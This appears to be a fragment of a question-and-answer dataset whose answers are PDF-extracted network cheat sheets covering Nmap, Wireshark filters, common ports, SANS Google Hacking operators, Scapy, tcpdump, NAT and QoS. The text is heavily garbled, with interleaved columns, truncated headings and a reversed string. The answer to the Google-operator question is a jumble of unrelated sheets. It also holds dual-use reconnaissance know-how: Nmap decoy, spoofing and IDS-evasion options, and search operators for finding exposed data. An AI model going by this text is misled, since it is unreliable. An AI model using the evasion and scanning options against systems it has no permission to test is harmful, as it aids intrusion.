TCP\nProbe parallelization\n-T3 Normal: Default, a dynamic timing model\nports\nbased on target responsiveness\n--min-rtt-timeout/max-rtt-\n-PE Use ICMP Echo Request -T4 Aggressive: Assumes a fast and reliable\ntimeout/initial-rtt-timeout <time>\nnetwork and may overwhelm targets\nSpecifies probe round trip time.\n-PP Use ICMP Timestamp Request -T5 Insane: Very aggressive; will likely\noverwhelm targets or miss open ports\n--max-retries <tries>\n-PM Use ICMP Netmask Request\nCaps number of port scan probe\nretransmissions.\nOutput Formats\nScan Types\n--host-timeout <time> -oN Standard Nmap output\n-sP Probe only (host discovery, not port scan) Give up on target after this long -oG Greppable format\n-oX XML format\n-sS SYN Scan --scan-delay/--max-scan-delay <time>\n-oA <basename>\nAdjust delay between probes\nGenerate Nmap, Greppable, and XML\n-sT TCP Connect Scan\noutput files using basename for files\n--min-rate <number>\n-sU UDP Scan Send packets no slower than\n<number> per second Misc Options\n-sV Version Scan\n-n Disable reverse IP address lookups\n--max-rate <number>\n-6 Use IPv6 only\nSend packets no faster than\n-O OS Detection\n-A Use several features, including OS\n<number> per second\nDetection, Version Detection, Script\n--scanflags Set custom list of TCP using\nScanning (default), and traceroute\nURGACKPSHRSTSYNFIN in any order\n--reason Display reason Nmap thinks port is\nopen, closed, or filtered\nmoc.tluafeDyBytiruceS\nTarget specification Service and version detection\nIP address, hostnames, networks, etc -sV: version detection --all-ports dont exclude ports\nExample: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 --version-all try every single probe\n-iL file input from list -iR n choose random targets, 0 never ending --version-trace trace version scan activity\n--exclude --excludefile file exclude host or list from file\n-O enable OS detection --fuzzy guess OS detection\n--max-os-tries set the maximum number of tries against a target\nHost discovery\n-PS n tcp syn ping -PA n tcp ack ping -PU n udp ping\nFirewall/IDS evasion\n-PM netmask req -PP timestamp req -PE echo req\n-f fragment packets -D d1,d2 cloak scan with decoys\n-sL list scan -PO protocol ping -PN no ping\n-S ip spoof source address –g source spoof source port\n-n no DNS -R DNS resolution for all targets\n--traceroute: trace path to host (for topology map) --randomize-hosts order --spoof-mac mac change the src mac\n-sP ping same as –PP –PM –PS443 –PA80\nVerbosity and debugging options\n-v Increase verbosity level --reason host and port reason\nPort scanning techniques\n-d (1-9) set debugging level --packet-trace trace packets\n-sS tcp syn scan -sT tcp connect scan -sU udp scan\n-sY sctp init scan -sZ sctp cookie echo -sO ip protocol\nInteractive options\n-sW tcp window -sN –sF -sX null, fin, xmas –sA tcp ack\nv/V increase/decrease verbosity level\nd/D increase/decrease debugging level\nPort specification and scan order\np/P turn on/off packet tracing\n-p n-m range -p- all ports -p n,m,z individual\n-p U:n-m,z T:n,m U for udp T for tcp -F fast, common 100 Miscellaneous options\n--top-ports n scan the highest-ratio ports -r don’t randomize --resume file resume aborted scan (from oN or oG output)\n-6 enable ipv6 scanning\n-A agressive same as -O -sV -sC --traceroute\nTiming and performance\n-T0 paranoid -T1 sneaky -T2 polite\nScripts\n-T3 normal -T4 aggresive -T5 insane\n-sC perform scan with default scripts --script file run script (or all)\n--min-hostgroup --max-hostgroup\n--script-args n=v provide arguments\n--min-rate --max-rate\n--script-trace print incoming and outgoing communication\n--min-parallelism --max-parallelism\n--min-rtt-timeout --max-rtt-timeout --initial-rtt-timeout Output\n--max-retries --host-timeout --scan-delay\n-oN normal -oX xml -oG grepable –oA all outputs\nExamples\nQuick scan nmap -T4 -F\nFast scan (port80) nmap -T4 --max_rtt_timeout 200 --initial_rtt_timeout 150 --min_hostgroup 512 --max_retries 0 -n -P0 -p80\nPingscan nmap -sP -PE -PP -PS21,23,25,80,113,31339 -PA80,113,443,10042 --source-port 53 -T4\nSlow comprehensive nmap -sS -sU -T4 -A -v -PE -PP -PS21,22,23,25,80,113,31339 -PA80,113,443,10042 -PO --script all\nQuick traceroute: nmap -sP -PE -PS22,25,80 -PA21,23,80,3389 -PU -PO --traceroute\nW D F · P 1\n\nIRESHARK ISPLAY ILTERS ART\npacketlife.net\nEthernet ARP\neth.addr eth.len eth.src arp.dst.hw_mac arp.proto.size\neth.dst eth.lg eth.trailer arp.dst.proto_ipv4 arp.proto.type\neth.ig eth.multicast eth.type arp.hw.size arp.src.hw_mac\narp.hw.type arp.src.proto_ipv4\n\nIEEE 802.1Q\narp.opcode\nvlan.cfi vlan.id vlan.priority\nvlan.etype vlan.len vlan.trailer TCP\ntcp.ack tcp.options.qs\nIPv4\ntcp.checksum tcp.options.sack\nip.addr ip.fragment.overlap.conflict\ntcp.checksum_bad tcp.options.sack_le\nip.checksum ip.fragment.toolongfragment\ntcp.checksum_good tcp.options.sack_perm\nip.checksum_bad ip.fragments\ntcp.continuation_to tcp.options.sack_re\nip.checksum_good ip.hdr_len\ntcp.dstport tcp.options.time_stamp\nip.dsfield ip.host\ntcp.flags tcp.options.wscale\nip.dsfield.ce ip.id\ntcp.flags.ack tcp.options.wscale_val\nip.dsfield.dscp ip.len\ntcp.flags.cwr tcp.pdu.last_frame\nip.dsfield.ect ip.proto\ntcp.flags.ecn tcp.pdu.size\nip.dst ip.reassembled_in\ntcp.flags.fin tcp.pdu.time\nip.dst_host ip.src\ntcp.flags.push tcp.port\nip.flags ip.src_host\ntcp.flags.reset tcp.reassembled_in\nip.flags.df ip.tos\ntcp.flags.syn tcp.segment\nip.flags.mf ip.tos.cost\ntcp.flags.urg tcp.segment.error\nip.flags.rb ip.tos.delay\ntcp.hdr_len tcp.segment.multipletails\nip.frag_offset ip.tos.precedence\ntcp.len tcp.segment.overlap\nip.fragment ip.tos.reliability\ntcp.nxtseq tcp.segment.overlap.conflict\nip.fragment.error ip.tos.throughput\ntcp.options tcp.segment.toolongfragment\nip.fragment.multipletails ip.ttl\ntcp.options.cc tcp.segments\nip.fragment.overlap ip.version\ntcp.options.ccecho tcp.seq\nIPv6 tcp.options.ccnew tcp.srcport\nipv6.addr ipv6.hop_opt tcp.options.echo tcp.time_delta\nipv6.class ipv6.host tcp.options.echo_reply tcp.time_relative\nipv6.dst ipv6.mipv6_home_address tcp.options.md5 tcp.urgent_pointer\nipv6.dst_host ipv6.mipv6_length tcp.options.mss tcp.window_size\nipv6.dst_opt ipv6.mipv6_type tcp.options.mss_val\nipv6.flow ipv6.nxt\nUDP\nipv6.fragment ipv6.opt.pad1\nudp.checksum udp.dstport udp.srcport\nipv6.fragment.error ipv6.opt.padn\nudp.checksum_bad udp.length\nipv6.fragment.more ipv6.plen\nudp.checksum_good udp.port\nipv6.fragment.multipletails ipv6.reassembled_in\nOperators Logic\nipv6.fragment.offset ipv6.routing_hdr\nipv6.fragment.overlap ipv6.routing_hdr.addr eq or == and or && Logical AND\nipv6.fragment.overlap.conflict ipv6.routing_hdr.left ne or != or or || Logical OR\nipv6.fragment.toolongfragment ipv6.routing_hdr.type gt or > xor or ^^ Logical XOR\nipv6.fragments ipv6.src lt or < not or ! Logical NOT\nipv6.fragment.id ipv6.src_host ge or >= [n] […] Substring operator\nipv6.hlim ipv6.version le or <=\nby Jeremy Stretch v2.0\nW D F · P 2\n\nIRESHARK ISPLAY ILTERS ART\npacketlife.net\nFrame Relay ICMPv6\nfr.becn fr.de icmpv6.all_comp icmpv6.option.name_type.fqdn\nfr.chdlctype fr.dlci icmpv6.checksum icmpv6.option.name_x501\nfr.control fr.dlcore_control icmpv6.checksum_bad icmpv6.option.rsa.key_hash\nfr.control.f fr.ea icmpv6.code icmpv6.option.type\nfr.control.ftype fr.fecn icmpv6.comp icmpv6.ra.cur_hop_limit\nfr.control.n_r fr.lower_dlci icmpv6.haad.ha_addrs icmpv6.ra.reachable_time\nfr.control.n_s fr.nlpid icmpv6.identifier icmpv6.ra.retrans_timer\nfr.control.p fr.second_dlci icmpv6.option icmpv6.ra.router_lifetime\nfr.control.s_ftype fr.snap.oui icmpv6.option.cga icmpv6.recursive_dns_serv\nfr.control.u_modifier_cmd fr.snap.pid icmpv6.option.length icmpv6.type\nfr.control.u_modifier_resp fr.snaptype icmpv6.option.name_type\nfr.cr fr.third_dlci\nRIP\nfr.dc fr.upper_dlci\nrip.auth.passwd rip.ip rip.route_tag\nPPP\nrip.auth.type rip.metric rip.routing_domain\nppp.address ppp.direction rip.command rip.netmask rip.version\nppp.control ppp.protocol rip.family rip.next_hop\n\nMPLS BGP\nmpls.bottom mpls.oam.defect_location bgp.aggregator_as bgp.mp_reach_nlri_ipv4_prefix\nmpls.cw.control mpls.oam.defect_type bgp.aggregator_origin bgp.mp_unreach_nlri_ipv4_prefix\nmpls.cw.res mpls.oam.frequency bgp.as_path bgp.multi_exit_disc\nmpls.exp mpls.oam.function_type bgp.cluster_identifier bgp.next_hop\nmpls.label mpls.oam.ttsi bgp.cluster_list bgp.nlri_prefix\nmpls.oam.bip16 mpls.ttl bgp.community_as bgp.origin\nbgp.community_value bgp.originator_id\n\nICMP\nbgp.local_pref bgp.type\nicmp.checksum icmp.ident icmp.seq\nbgp.mp_nlri_tnl_id bgp.withdrawn_prefix\nicmp.checksum_bad icmp.mtu icmp.type\nicmp.code icmp.redir_gw HTTP\nhttp.accept http.proxy_authorization\nDTP\nhttp.accept_encoding http.proxy_connect_host\ndtp.neighbor dtp.tlv_type vtp.neighbor\nhttp.accept_language http.proxy_connect_port\ndtp.tlv_len dtp.version\nhttp.authbasic http.referer\nVTP\nhttp.authorization http.request\nvtp.code vtp.vlan_info.802_10_index http.cache_control http.request.method\nvtp.conf_rev_num vtp.vlan_info.isl_vlan_id http.connection http.request.uri\nvtp.followers vtp.vlan_info.len http.content_encoding http.request.version\nvtp.md vtp.vlan_info.mtu_size http.content_length http.response\nvtp.md5_digest vtp.vlan_info.status.vlan_susp http.content_type http.response.code\nvtp.md_len vtp.vlan_info.tlv_len http.cookie http.server\nvtp.seq_num vtp.vlan_info.tlv_type http.date http.set_cookie\nvtp.start_value vtp.vlan_info.vlan_name http.host http.transfer_encoding\nvtp.upd_id vtp.vlan_info.vlan_name_len http.last_modified http.user_agent\nvtp.upd_ts vtp.vlan_info.vlan_type http.location http.www_authenticate\nvtp.version http.notification http.x_forwarded_for\nhttp.proxy_authenticate\nby Jeremy Stretch v2.0\nC P\n\nOMMON ORTS\npacketlife.net\nTCP/UDP Port Numbers\n7 Echo 554 RTSP 2745 Bagle.H 6891-6901 Windows Live\n19 Chargen 546-547 DHCPv6 2967 Symantec AV 6970 Quicktime\n20-21 FTP 560 rmonitor 3050 Interbase DB 7212 GhostSurf\n22 SSH/SCP 563 NNTP over SSL 3074 XBOX Live 7648-7649 CU-SeeMe\n23 Telnet 587 SMTP 3124 HTTP Proxy 8000 Internet Radio\n25 SMTP 591 FileMaker 3127 MyDoom 8080 HTTP Proxy\n42 WINS Replication 593 Microsoft DCOM 3128 HTTP Proxy 8086-8087 Kaspersky AV\n43 WHOIS 631 Internet Printing 3222 GLBP 8118 Privoxy\n49 TACACS 636 LDAP over SSL 3260 iSCSI Target 8200 VMware Server\n53 DNS 639 MSDP (PIM) 3306 MySQL 8500 Adobe ColdFusion\n67-68 DHCP/BOOTP 646 LDP (MPLS) 3389 Terminal Server 8767 TeamSpeak\n69 TFTP 691 MS Exchange 3689 iTunes 8866 Bagle.B\n70 Gopher 860 iSCSI 3690 Subversion 9100 HP JetDirect\n79 Finger 873 rsync 3724 World of Warcraft 9101-9103 Bacula\n80 HTTP 902 VMware Server 3784-3785 Ventrilo 9119 MXit\n88 Kerberos 989-990 FTP over SSL 4333 mSQL 9800 WebDAV\n102 MS Exchange 993 IMAP4 over SSL 4444 Blaster 9898 Dabber\n110 POP3 995 POP3 over SSL 4664 Google Desktop 9988 Rbot/Spybot\n113 Ident 1025 Microsoft RPC 4672 eMule 9999 Urchin\n119 NNTP (Usenet) 1026-1029 Windows Messenger 4899 Radmin 10000 Webmin\n123 NTP 1080 SOCKS Proxy 5000 UPnP 10000 BackupExec\n135 Microsoft RPC 1080 MyDoom 5001 Slingbox 10113-10116 NetIQ\n137-139 NetBIOS 1194 OpenVPN 5001 iperf 11371 OpenPGP\n143 IMAP4 1214 Kazaa 5004-5005 RTP 12035-12036 Second Life\n161-162 SNMP 1241 Nessus 5050 Yahoo! Messenger 12345 NetBus\n177 XDMCP 1311 Dell OpenManage 5060 SIP 13720-13721 NetBackup\n179 BGP 1337 WASTE 5190 AIM/ICQ 14567 Battlefield\n201 AppleTalk 1433-1434 Microsoft SQL 5222-5223 XMPP/Jabber 15118 Dipnet/Oddbob\n264 BGMP 1512 WINS 5432 PostgreSQL 19226 AdminSecure\n318 TSP 1589 Cisco VQP 5500 VNC Server 19638 Ensim\n381-383 HP Openview 1701 L2TP 5554 Sasser 20000 Usermin\n389 LDAP 1723 MS PPTP 5631-5632 pcAnywhere 24800 Synergy\n411-412 Direct Connect 1725 Steam 5800 VNC over HTTP 25999 Xfire\n443 HTTP over SSL 1741 CiscoWorks 2000 5900+ VNC Server 27015 Half-Life\n445 Microsoft DS 1755 MS Media Server 6000-6001 X11 27374 Sub7\n464 Kerberos 1812-1813 RADIUS 6112 Battle.net 28960 Call of Duty\n465 SMTP over SSL 1863 MSN 6129 DameWare 31337 Back Orifice\n497 Retrospect 1985 Cisco HSRP 6257 WinMX 33434+ traceroute\n500 ISAKMP 2000 Cisco SCCP 6346-6347 Gnutella Legend\n512 rexec 2002 Cisco ACS 6500 GameSpy Arcade Chat\n513 rlogin 2049 NFS 6566 SANE Encrypted\n514 syslog 2082-2083 cPanel 6588 AnalogX\nGaming\n515 LPD/LPR 2100 Oracle XDB 6665-6669 IRC\nMalicious\n520 RIP 2222 DirectAdmin 6679/6697 IRC over SSL\nPeer to Peer\n521 RIPng (IPv6) 2302 Halo 6699 Napster\nStreaming\n540 UUCP 2483-2484 Oracle DB 6881-6999 BitTorrent\nIANA port assignments published at http://www.iana.org/assignments/port-numbers\nby Jeremy Stretch v1.1\nAdvanced Operators Number Searching\nAdvanced Operators Meaning What To Type Into Search Box (& Description of Results) Number Searching Description\nsite: Search only one website conference site:www.sans.org(Search SANS site for conference info) 1Z9999W99999999999 UPS tracking numbers\n[#]…[#] or numrange: Search within a range of numbers plasma television $1000...1500(Search for plasma televisions between $1000 and $1500) 999999999999 FedEx tracking numbers\ndate: Search only a range of months hockey date: 3(Search for hockey references within past 3 months; 6 and 12-month date- 9999 9999 9999 9999 9999 99 USPS tracking numbers\nrestrict options also available)\nAAAAA999A9AA99999 Vehicle Identification Numbers (VIN)\nsafesearch: Exclude adult-content safesearch: sex education(Search for sex education material without returning adult sites)\n305214274002 UPC codes\nlink: linked pages link:www.sans.org(Find pages that link to the SANS website)\n202 Telephone area codes\ninfo: Info about a page info:www.sans.org(Find information about the SANS website)\npatent 5123123 Patent numbers\nrelated: Related pages related:www.stanford.edu(Find websites related to the Stanford website) (Remember to put the word \"patent\"\nbefore your patent number)\nintitle: Searches for strings in the intitle:conference (Find pages with \"conference\" in the page title)\ntitle of the page n199ua FAA airplane registration numbers\n(An airplane's FAA registration number\nallintitle: Searches for all strings within allintitle:conference SANS (Find pages with \"conference\" and \"SANS\" in the page title. is typically printed on its tail)\nthe page title Doesn't combine well with other operators)\nfcc B4Z-34009-PIR FCC equipment IDs\ninurl: Searches for strings in the URL inurl:conference(Find pages with the string \"conference\" in the URL) (Remember to put the word \"fcc\"\nbefore the equipment ID)\nallinurl: Searches for all strings allinurl:conference SANS(Find pages with “conference” and \"SANS\" in the URL.\nwithin the URL Doesn't combine well with other operators)\nCalculator Operators\nfiletype:or ext: Searches for files with that filetype:ppt (Find files with the \"ppt\" file extension.\nfile extension \".ppt\" are MS PowerPoint files.)\nOperators Meaning Type Into Search Box\ncache: Display the Google cache cache:www.sans.org (Show the cached version of the page without performing the search)\n+ addition 45 + 39\nof the page\n- subtraction 45 – 39\nphonebook:or Display all, residential, phonebook:Rick Smith MD (Find all phone book listing for Rick Smith in Maryland.\nrphonebook:or business phone listings Cannot combine with other searches)\n* multiplication 45 * 39\nbphonebook\n/ division 45 / 39\nauthor: Searches for the author of a author:Rick (Find all newsgroup postings with \"Rick\" in the author name or email address.\nnewsgroup post Must be used with a Google Group search)\n% of percentage of 45% of 39\ninsubject: Search only in the subject of a insubject:Mac OS X (Find all newsgroup postings with \"Mac OS X\" in the subject of the\n^ raise to a power 2^5\nnewsgroup post post. Must be used with a Google Group search)\n(2 to the 5th power)\ndefine: Various definitions of the word define:sarcastic(Get the definition of the word sarcastic)\nor phrase\nstock: Get information on a stock stock:AAPL (Get the stock information for Apple Computer, Inc.)\nabbreviation\nOperator Examples Search Parameters\nGoogle\nOperator Example Finds Pages Containing Search Value Description of Use in\nHacking and Defense\nParameters Google Search URLs\nsailboat chesapeake bay the words sailboat, Chesapeake and Cheat Sheet\nBay q the search term The search term"
  },
  {
    "input": "What are the key Google search operators and their purposes as outlined in the SANS Stay Sharp Program Pocket Reference Guide?",
    "summary": "This document provides a guide to Google search operators and Scapy packet manipulation commands, along with examples for their use. It also explains NAT configuration and Quality of Service (QoS) models, including IP TOS, DSCP, and Ethernet CoS markings. The guide is intended for use in the SANS Google Hacking course and includes troubleshooting and configuration tips for NAT and QoS.",
    "output": "POCKET REFERENCE GUIDE\nsloop ORyawl either the word sloopor the word yawl filter 0 or 1 If filteris set to 0, show\npotentially duplicate results.\nSANS Stay Sharp Program\n“To each his own” the exact phrase to each his own\nas_epq a search phrase The value submitted is as an http://www.sans.org\nvirus -computer the word virusbut NOT the word exact phrase. No need to http://www.sans.org/staysharp\ncomputer surround with quotes.\nPurpose\nStar Wars Episode +III This movie title, including the roman as_ft i = include The file type indicated by\nnumeral III e = exclude as_filetypeis included or This document aims to be a quick reference\nexcluded in the search.\noutlining all Google operators, their\n~boat loan loan info for both the word boatand its\nsynonyms: canoe, ferry, etc. as_filetype a file extension The file type is included or meaning, and examples of their usage.\nexcluded in the search\ndefine:sarcastic definitions of the word sarcasticfrom indicated by as_ft.\nthe Web What to use this sheet for\nas_occt any = anywhere Find the search term\nUse this sheet as a handy reference that outlines the\nmac * x the words Macand Xseparated by title = page title in the specified location.\nexactly one word body = text of page various Google searches that you can perform. It is\nurl = in the page URL\nmeant to support you throughout the Google Hacking\nI’m Feeling Lucky Takes you directly to first web page links = in links to\n(Google link) returned for your query the page and Defense course and can be used as a quick\nreference guide and refresher on all Google advanced\nas_dt i = include The site or domain indicated\noperators used in this course. The student could also\ne = exclude by as_sitesearchis included\nor excluded in the search. use this sheet as guidance in building innovative\noperator combinations and new search techniques.\nas_sitesearch site or domain The file type is included or\nexcluded in the search This sheet is split into these sections:\nindicated by as_dt.\n• Operator Examples\nas_qdr m3 = three months Locate pages updated with in\n• Advanced Operators\nm6 = six months the specified time frame.\ny = past year • Number Searching\n• Calculator Operators\n• Search Parameters\nReferences:\nhttp://www.google.com/intl/en/help/refinesearch.html\nhttp://johnny.ihackstuff.com\nhttp://www.google.com/intl/en/help/cheatsheet.htm\nl\n©SANS Institute 2006\n\nSCAPY\npacketlife.net\nBasic Commands Specifying Addresses and Values\nls()\n# Explicit IP address (use quotation marks)\nList all available protocols and protocol options\n>>> IP(dst=\"192.0.2.1\")\nlsc()\nList all available scapy command functions # DNS name to be resolved at time of transmission\nconf >>> IP(dst=\"example.com\")\nShow/set scapy configuration parameters\n# IP network (results in a packet template)\nConstructing Packets\n>>> IP(dst=\"192.0.2.0/24\")\n# Setting protocol fields\n# Random addresses with RandIP() and RandMAC()\n>>> ip=IP(src=\"10.0.0.1\")\n>>> IP(dst=RandIP())\n>>> ip.dst=\"10.0.0.2\"\n>>> Ether(dst=RandMAC())\n# Combining layers\n# Set a range of numbers to be used (template)\n>>> l3=IP()/TCP()\n>>> IP(ttl=(1,30))\n>>> l2=Ether()/l3\n# Random numbers with RandInt() and RandLong()\n# Splitting layers apart\n>>> IP(id=RandInt())\n>>> l2.getlayer(1)\n<IP frag=0 proto=tcp |<TCP |>>\nSending Packets\n>>> l2.getlayer(2)\n<TCP |> send(pkt, inter=0, loop=0, count=1, iface=N)\nSend one or more packets at layer three\nDisplaying Packets sendp(pkt, inter=0, loop=0, count=1, iface=N)\nSend one or more packets at layer two\n# Show an entire packet\nsendpfast(pkt, pps=N, mbps=N, loop=0, iface=N)\n>>> (Ether()/IPv6()).show()\nSend packets much faster at layer two using tcpreplay\n###[ Ethernet ]###\ndst= ff:ff:ff:ff:ff:ff\n>>> send(IP(dst=\"192.0.2.1\")/UDP(dport=53))\nsrc= 00:00:00:00:00:00\n.\ntype= 0x86dd\nSent 1 packets.\n###[ IPv6 ]###\n>>> sendp(Ether()/IP(dst=\"192.0.2.1\")/UDP(dport=53))\nversion= 6\n.\ntc= 0\nSent 1 packets.\nfl= 0\nplen= None\nSending and Receiving Packets\nnh= No Next Header\nhlim= 64 sr(pkt, filter=N, iface=N), srp(…)\nsrc= ::1 Send packets and receive replies\ndst= ::1 sr1(pkt, inter=0, loop=0, count=1, iface=N), srp1(…)\nSend packets and return only the first reply\n# Show field types with default values\nsrloop(pkt, timeout=N, count=N), srploop(…)\n>>> ls(UDP())\nSend packets in a loop and print each reply\nsport : ShortEnumField = 1025 (53)\ndport : ShortEnumField = 53 (53) >>> srloop(IP(dst=\"packetlife.net\")/ICMP(), count=3)\nlen : ShortField = None (None) RECV 1: IP / ICMP 174.143.213.184 > 192.168.1.140\nchksum : XShortField = None (None) RECV 1: IP / ICMP 174.143.213.184 > 192.168.1.140\nRECV 1: IP / ICMP 174.143.213.184 > 192.168.1.140\nFuzzing\nSniffing Packets\n# Randomize fields where applicable\nsniff(count=0, store=1, timeout=N)\n>>> fuzz(ICMP()).show()\nRecord packets off the wire; returns a list of packets when stopped\n###[ ICMP ]###\ntype= <RandByte>\n# Capture up to 100 packets (or stop with ctrl-c)\ncode= 227\n>>> pkts=sniff(count=100, iface=\"eth0\")\nchksum= None\n>>> pkts\nunused= <RandInt>\n<Sniffed: TCP:92 UDP:7 ICMP:1 Other:0>\nby Jeremy Stretch v1.0\n\nTCPDUMP\npacketlife.net\nCommand Line Options\n-A Print frame payload in ASCII -q Quick output\n-c <count> Exit after capturing count packets -r <file> Read packets from file\n-D List available interfaces -s <len> Capture up to len bytes per packet\n-e Print link-level headers -S Print absolute TCP sequence numbers\n-F <file> Use file as the filter expression -t Don't print timestamps\n-G <n> Rotate the dump file every n seconds -v[v[v]] Print more verbose output\n-i <iface> Specifies the capture interface -w <file> Write captured packets to file\n-K Don't verify TCP checksums -x Print frame payload in hex\n-L List data link types for the interface -X Print frame payload in hex and ASCII\n-n Don't convert addresses to names -y <type> Specify the data link type\n-p Don't capture in promiscuous mode -Z <user> Drop privileges from root to user\nCapture Filter Primitives\n[src|dst] host <host> Matches a host as the IP source, destination, or either\nether [src|dst] host <ehost> Matches a host as the Ethernet source, destination, or either\ngateway host <host> Matches packets which used host as a gateway\n[src|dst] net <network>/<len> Matches packets to or from an endpoint residing in network\n[tcp|udp] [src|dst] port <port> Matches TCP or UDP packets sent to/from port\n[tcp|udp] [src|dst] portrange <p1>-<p2> Matches TCP or UDP packets to/from a port in the given range\nless <length> Matches packets less than or equal to length\ngreater <length> Matches packets greater than or equal to length\n(ether|ip|ip6) proto <protocol> Matches an Ethernet, IPv4, or IPv6 protocol\n(ether|ip) broadcast Matches Ethernet or IPv4 broadcasts\n(ether|ip|ip6) multicast Matches Ethernet, IPv4, or IPv6 multicasts\ntype (mgt|ctl|data) [subtype <subtype>] Matches 802.11 frames based on type and optional subtype\nvlan [<vlan>] Matches 802.1Q frames, optionally with a VLAN ID of vlan\nmpls [<label>] Matches MPLS packets, optionally with a label of label\n<expr> <relop> <expr> Matches packets by an arbitrary expression\nProtocols Modifiers Examples\narp ip6 slip ! or not udp dst port not 53 UDP not bound for port 53\nether link tcp && or and host 10.0.0.1 && host 10.0.0.2 Traffic between these hosts\nfddi ppp tr || or or tcp dst port 80 or 8080 Packets to either TCP port\nicmp radio udp\nICMP Types\nip rarp wlan\nicmp-echoreply icmp-routeradvert icmp-tstampreply\nTCP Flags icmp-unreach icmp-routersolicit icmp-ireq\ntcp-urg tcp-rst icmp-sourcequench icmp-timxceed icmp-ireqreply\ntcp-ack tcp-syn icmp-redirect icmp-paramprob icmp-maskreq\ntcp-psh tcp-fin icmp-echo icmp-tstamp icmp-maskreply\nby Jeremy Stretch v2.0\n\nN A T\n\nETWORK DDRESS RANSLATION\npacketlife.net\nFastEthernet0 FastEthernet1\n\n10.0.0.1/16 174.143.212.1/22\nNAT Inside NAT Outside\nNAT Boundary Configuration\nPerspective\ninterface FastEthernet0\nip address 10.0.0.1 255.255.0.0\nip nat inside\n!\ninterface FastEthernet1\nip address 174.143.212.1 255.255.252.0\nip nat outside\nStatic Source Translation\n! One line per static translation\nip nat inside source static 10.0.0.19 192.0.2.1\nip nat inside source static 10.0.1.47 192.0.2.2\nip nat outside source static 174.143.212.133 10.0.0.47\nip nat outside source static 174.143.213.240 10.0.2.181\nDynamic Source Translation\n! Create an access list to match inside local addresses\naccess-list 10 permit 10.0.0.0 0.0.255.255\n!\n! Create NAT pool of inside global addresses\nip nat pool MyPool 192.0.2.1 192.0.2.254 prefix-length 24\n!\n! Combine them with a translation rule\nip nat inside source list 10 pool MyPool\n!\n! Dynamic translations can be combined with static entries\nip nat inside source static 10.0.0.42 192.0.2.42\nPort Address Translation (PAT)\n! Static layer four port translations\nip nat inside source static tcp 10.0.0.3 8080 192.0.2.1 80\nip nat inside source static udp 10.0.0.14 53 192.0.2.2 53\nip nat outside source static tcp 174.143.212.4 23 10.0.0.8 23\n!\n! Dynamic port translation with a pool\nip nat inside source list 11 pool MyPool overload\n!\n! Dynamic translation with interface overloading\nip nat inside source list 11 interface FastEthernet1 overload\nInside Destination Translation\n! Create a rotary NAT pool\nip nat pool LoadBalServers 10.0.99.200 10.0.99.203 prefix-length 24 type rotary\n!\n! Enable load balancing across inside hosts for incoming traffic\nip nat inside destination list 12 pool LoadBalServers\nby Jeremy Stretch v1.0\nnoitacoL\nExample Topology Address Classification\nAn actual address assigned to\nInside Local\nan inside host\nAn inside address seen from\nInside Global\nthe outside\nAn actual address assigned to\nOutside Global\nan outside host\nAn outside address seen from\nOutside Local\nthe inside\nLocal Global\nInside Inside Local Inside Global\nOutside Outside Local Outside Global\nTerminology\nNAT Pool\nA pool of IP addresses to be used as inside\nglobal or outside local addresses in translations\nPort Address Translation (PAT)\nAn extension to NAT that translates information\nat layer four and above, such as TCP and UDP\nport numbers; dynamic PAT configurations\ninclude the overload keyword\nExtendable Translation\nThe extendable keyword must be appended\nwhen multiple overlapping static translations are\nconfigured\nSpecial NAT Pool Types\nRotary Used for load balancing\nMatch- Preserves the host portion of\nHost the address after translation\nTroubleshooting\nshow ip nat translations [verbose]\nshow ip nat statistics\nclear ip nat translations\nNAT Translations Tuning\nip nat translation tcp-timeout <seconds>\nip nat translation udp-timeout <seconds>\nip nat translation max-entries <number>\nQ S · P 1\n\nUALITY OF ERVICE ART\npacketlife.net\nQuality of Service Models IP Type of Service (TOS)\nBest Effort · No QoS policies are implemented\nPrecedence\nIntegrated Services (IntServ)\nResource Reservation Protocol (RSVP) is used to reserve bandwidth per-\nflow across all nodes in a path Ver HL TOS Len\nDifferentiated Services (DiffServ)\nPackets are individually classified and marked; policy decisions are made DSCP\nindependently by each node in a path\nPrecedence/DSCP\nLayer 2 QoS Markings\nBinary DSCP Prec.\nMedium Name Type\n56 111000 Reserved 7\nEthernet Class of Service (CoS) 3-bit 802.1p field in 802.1Q header\n48 110000 Reserved 6\nFrame Relay Discard Eligibility (DE) 1-bit drop eligibility flag\n46 101110 EF 5\nATM Cell Loss Priority (CLP) 1-bit drop eligibility flag\n32 100000 CS4\nMPLS Traffic Class (TC) 3-bit field compatible with 802.1p\n34 100010 AF41\nIP QoS Markings 4\n36 100100 AF42\nIP Precedence\nThe first three bits of the IP TOS field; limited to 8 traffic classes 38 100110 AF43\nDifferentiated Services Code Point (DSCP) 24 011000 CS3\nThe first six bits of the IP TOS are evaluated to provide more granular\n26 011010 AF31\nclassification; backward-compatible with IP Precedence\n3\n28 011100 AF32\nQoS Flowchart\n30 011110 AF33\n16 010000 CS2\n18 010010 AF21\n2\nQueuing Hardware\n20 010100 AF22\nDecision Queue\n22 010110 AF23\n8 001000 CS1\n10 001010 AF11\n1\n12 001100 AF12\n14 001110 AF13\n0 000000 BE 0\nby Jeremy Stretch v2.0\nScheduler\nNo\nSoftware Queue\nHW Yes\nQueue Software Queue\nFull?\nSoftware Queue\nTerminology\nPer-Hop Behavior (PHB)\nThe individual QoS action performed at each independent DiffServ node\nTrust Boundary · Beyond this, inbound QoS markings are not trusted\nTail Drop · Occurs when a packet is dropped because a queue is full\nCongestion Avoidance\nPolicing\nImposes an artificial ceiling on the amount of bandwidth that may be Random Early Detection (RED)\nconsumed; traffic exceeding the policer rate is reclassified or dropped Packets are randomly dropped\nbefore a queue is full to prevent tail\nShaping\ndrop; mitigates TCP\nSimilar to policing but buffers excess traffic for delayed transmission;\nsynchronization\nmakes more efficient use of bandwidth but introduces a delay\nTCP Synchronization Weighted RED (WRED)\nFlows adjust TCP window sizes in synch, making inefficient use of a link RED with the added capability of\nrecognizing prioritized traffic based\nDSCP Per-Hop Behaviors on its marking\nClass Selector (CS) · Backward-compatible with IP Precedence values Class-Based WRED (CBWRED)\nWRED employed inside a class-\nAssured Forwarding (AF) · Four classes with variable drop preferences\nbased WFQ (CBWFQ) queue\nExpedited Forwarding (EF) · Priority queuing for delay-sensitive traffic\nQ S · P 2\n\nUALITY OF ERVICE ART\npacketlife.net\nQueuing Comparison"
  },
  {
    "input": "What are the key differences between FIFO, PQ, CQ, WFQ, and LLQ in terms of their queueing mechanisms, bandwidth allocation, and support for delay-sensitive traffic?",
